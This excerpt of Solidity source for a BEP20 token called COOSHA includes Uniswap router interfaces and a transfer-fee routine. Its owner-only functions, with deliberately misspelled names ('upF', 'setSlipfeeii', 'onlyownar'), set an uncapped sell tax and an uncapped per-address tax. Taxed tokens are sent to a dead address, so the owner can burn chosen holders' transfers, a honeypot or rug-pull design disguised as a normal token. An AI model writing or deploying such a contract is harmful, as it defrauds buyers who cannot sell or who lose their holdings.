...
interface IUniswapV2Factory {
    ...
    function feeiiTo() external view returns (address);
    function feeiiToSetter() external view returns (address);
    ...
    function setfeeiiTo(address) external;
    function setfeeiiToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeeiiOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfeeiiOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfeeiiOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfeeiiOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeeiiOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract COOSHA is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfeeii = 0;

    uint256 private _defaultBuyfeeii = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfeeii;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfeeii = _value;
    }

    function setSlipfeeii(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfeeii[_address] = _value;
    }

    function getSlipfeeii(address _address) external view onlyownar returns (uint256) {
        return _slipfeeii[_address];
    }


    function setMAccountfeeii(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfeeii(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefeeiiAmount = 0;

        if (rF) {
            uint256 tradefeeii = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeeii = _defaultSellfeeii;
                }
                if (from == uniswapV2Pair) {

                    tradefeeii = _defaultBuyfeeii;
                }
            }
            if (_slipfeeii[from] > 0) {
                tradefeeii = _slipfeeii[from];
            }

            tradefeeiiAmount = _Amount.mul(tradefeeii).div(100);
        }


        if (tradefeeiiAmount > 0) {
            _balances[from] = _balances[from].sub(tradefeeiiAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeeiiAmount);
            emit Transfer(from, _deadAddress, tradefeeiiAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefeeiiAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefeeiiAmount);
        emit Transfer(from, _to, _Amount - tradefeeiiAmount);
    }
